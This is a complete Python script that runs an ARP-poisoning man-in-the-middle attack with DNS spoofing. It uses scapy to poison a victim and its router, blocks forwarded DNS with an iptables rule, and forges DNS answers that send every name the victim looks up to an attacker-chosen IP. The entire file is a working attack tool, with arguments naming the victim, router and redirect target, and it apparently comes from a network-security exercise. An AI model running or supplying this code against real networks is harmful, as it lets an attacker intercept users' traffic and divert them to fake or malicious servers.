#!/usr/bin/python3

import subprocess, os
import threading
from scapy.all import *
import argparse

redirectIP = ""

"""
Get user input through command-line arguments.

:return the list of command-line arguments.
"""
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", help="IP address of victim", required=True)
    parser.add_argument("-l", "--local", help="IP address of the local machine. Specify this one if there is no directed IP. Cannot be specified at the same time with --redirect")
    parser.add_argument("-r", "--router", help="IP address of router", required=True)
    parser.add_argument("-re", "--redirect", help="IP address of where victim will be directed to. ")
    return parser.parse_args()

"""
Check if the user is a root user. If not, print out a message and exit.
"""
def checkRootPrivilege():
    if os.geteuid() != 0:
        sys.exit("[!] Please run the script as root.")

"""
Enable IP forwarding and set a firewall rule to drop any DNS request.
"""
def setup():
    # Enable fowarding of DNS request to router
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    # Add iptables rule to drop any DNS request
    subprocess.Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE)

"""
Disable IP forwarding and remove the firewall rule to drop any DNS request.
"""
def restore():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('0\n')
    # Remoce iptables rule to drop any DNS request
    subprocess.Popen(["iptables -D FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE,)
    print("Exiting...")

"""
Get the local machine MAC address from the given interface

:param interface: ethernet interface
:return the MAC address
"""
def getLocalMAC(interface):
    mac = ""
    try:
        mac = open('/sys/class/net/' + interface + '/address').readline()
    except:
        mac = "00:00:00:00:00:00"
    return mac[:17]

"""
Get the MAC address from the given IP.

:param IP: the IP to extract MAC address
:return the MAC address of the given IP
"""
def getTargetMAC(IP):
    ans, unans = arping(IP, verbose=0)
    for s,r in ans:
        return r[Ether].src

"""
ARP poisoning for both victim machine and the router.

:param routerIP: IP address of the router
:param victimIP: IP address of the victim machine
:param routerMAC: MAC address of the router
:param victimMAC: MAC address of the victim machine
"""
def arpPoison(routerIP, victimIP, routerMAC, victimMAC):
    print("Starting ARP poisoning to {}".format(victimIP))
    while True:
        time.sleep(2)
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

"""
Craft a DNS response and send it back.

:param packet: sniffed DNS packet
"""
def parsePacket(packet):
    global redirectIP
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        response = (IP(dst=packet[IP].src, src=packet[IP].dst)/\
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                    an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=redirectIP)))
        send(response, verbose=0)

"""
Sniffing traffic for DNS request with the source IP is the victim IP.

:param victimIP: IP address of the victim machine
"""
def listen(victimIP):
    mFilter = "udp and port 53 and src " + victimIP
    sniff(filter=mFilter, prn=parsePacket)

"""
The main function of the application. Get the user input from the argument parser.
Perform initial check to see if the victim will be forward to the attacker machine
or the another machine. After that, ARP poisoning and reply to any DNS request from
the victim machine.

:param args: command-line arguments from the user
"""
def main(args):
    global redirectIP
    checkRootPrivilege()
    victimIP = str(args.victim)
    routerIP = str(args.router)
    victimMAC = getTargetMAC(victimIP)
    routerMAC = getTargetMAC(routerIP)
    localIP = args.local
    redirect = args.redirect

    if localIP is None and redirect is None:
        sys.exit("Specify either local IP or redirected IP. None is provided.")
    elif localIP is not None and redirect is not None:
        sys.exit("Specify either local IP or redirected IP. Cannot accept both.")
    else:
        if localIP is not None:
            redirectIP = str(localIP)
        elif redirect is not None:
            redirectIP = str(redirect)

    # Print the user input
    print("Victim IP: {} Victim MAC: {}".format(victimIP, victimMAC))
    print("Router IP: {} Router MAC: {}".format(routerIP, routerMAC))
    print("Forwarding DNS requests to: {}".format(redirectIP))

    # Main functionalities
    setup()
    arpThread = threading.Thread(target=arpPoison, args=(routerIP, victimIP, routerMAC, victimMAC))
    arpThread.daemon = True
    listenThread = threading.Thread(target=listen, args=(victimIP,))
    listenThread.daemon = True

    arpThread.start()
    listenThread.start()

    while True:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            restore()
            sys.exit(0)

if __name__ == '__main__':
    main(parse_args())
